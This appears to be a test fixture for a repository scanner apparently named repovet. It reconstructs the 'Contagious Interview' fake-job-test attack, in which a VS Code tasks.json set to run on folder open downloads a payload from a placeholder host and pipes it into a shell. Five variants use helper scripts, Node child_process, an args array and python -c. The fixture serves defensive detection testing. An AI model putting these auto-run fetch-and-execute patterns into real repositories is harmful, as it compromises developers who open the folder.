id: vscode-folder-open-task
title: VS Code task that runs on folder open (fake job interviews)
kind: incident
year: 2025
technique: >
  In "Contagious Interview" campaigns, attackers send developers a repository for a
  job test or code review. Its .vscode/tasks.json defines a hidden task with
  runOn: folderOpen that downloads the next stage with curl or wget and pipes it into
  a shell as soon as the folder is opened and trusted.
sources:
  - https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/
  - https://code.visualstudio.com/docs/editor/tasks
reconstruction: >
  The task layout from the public analysis (per-OS commands, runOn folderOpen) with
  downloads from example.invalid. The "presentation" block that hides the terminal is
  left out: Windows Defender quarantines files with that combination before they can
  be read, and no rule depends on it.
files:
  .vscode/tasks.json: |
    {
      "version": "2.0.0",
      "tasks": [
        {
          "label": "env",
          "type": "shell",
          "osx": {"command": "curl -s 'https://example.invalid/settings/mac' | bash"},
          "linux": {"command": "wget -qO- 'https://example.invalid/settings/linux' | sh"},
          "windows": {"command": "curl https://example.invalid/settings/windows | cmd"},
          "runOptions": {"runOn": "folderOpen"}
        }
      ]
    }
  README.md: |
    # Coding exercise
    Open this folder in VS Code and complete the task in src/.
must_fire:
  - {rule: RC-AUTO-020, path: .vscode/tasks.json}
  - {rule: RC-AUTO-021, path: .vscode/tasks.json}
must_not_fire: [RC-AUTO-022, RC-AGENT-024]
not_covered: >
  Where antivirus software quarantines such a file before repovet reads it, the file
  appears under "Not checked" (could not be read) instead of as a finding.

variants:
  - id: helper-script
    technique: The task only starts a script in the repository; the script pipes a download into a shell.
    files:
      .vscode/tasks.json: |
        {
          "version": "2.0.0",
          "tasks": [
            {
              "label": "env",
              "type": "shell",
              "command": "./scripts/setup.sh",
              "runOptions": {"runOn": "folderOpen"}
            }
          ]
        }
      scripts/setup.sh: |
        #!/bin/sh
        curl -s https://example.invalid/settings/linux | sh
  - id: helper-script-env-sh
    technique: Helper script that pipes the download into `env sh` instead of `sh`.
    files:
      .vscode/tasks.json: |
        {
          "version": "2.0.0",
          "tasks": [
            {
              "label": "env",
              "type": "shell",
              "command": "bash ${workspaceFolder}/scripts/setup.sh",
              "runOptions": {"runOn": "folderOpen"}
            }
          ]
        }
      scripts/setup.sh: |
        #!/bin/bash
        curl -s https://example.invalid/settings/linux | env sh
  - id: node-helper
    technique: The task starts a Node script that runs the download through child_process.
    files:
      .vscode/tasks.json: |
        {
          "version": "2.0.0",
          "tasks": [
            {
              "label": "env",
              "type": "shell",
              "command": "node .vscode/setup.js",
              "runOptions": {"runOn": "folderOpen"}
            }
          ]
        }
      .vscode/setup.js: |
        const { execSync } = require("child_process");
        execSync("curl -s https://example.invalid/settings/linux | sh");
  - id: args-array
    technique: The command is split into `command` and an `args` array.
    files:
      .vscode/tasks.json: |
        {
          "version": "2.0.0",
          "tasks": [
            {
              "label": "env",
              "type": "process",
              "command": "bash",
              "args": ["-c", "wget -qO- https://example.invalid/settings/linux | bash"],
              "runOptions": {"runOn": "folderOpen"}
            }
          ]
        }
  - id: python-c-substitution
    technique: Command substitution of the download passed to `python -c`.
    files:
      .vscode/tasks.json: |
        {
          "version": "2.0.0",
          "tasks": [
            {
              "label": "env",
              "type": "shell",
              "command": "python3 -c \"$(curl -s https://example.invalid/settings/env.py)\"",
              "runOptions": {"runOn": "folderOpen"}
            }
          ]
        }
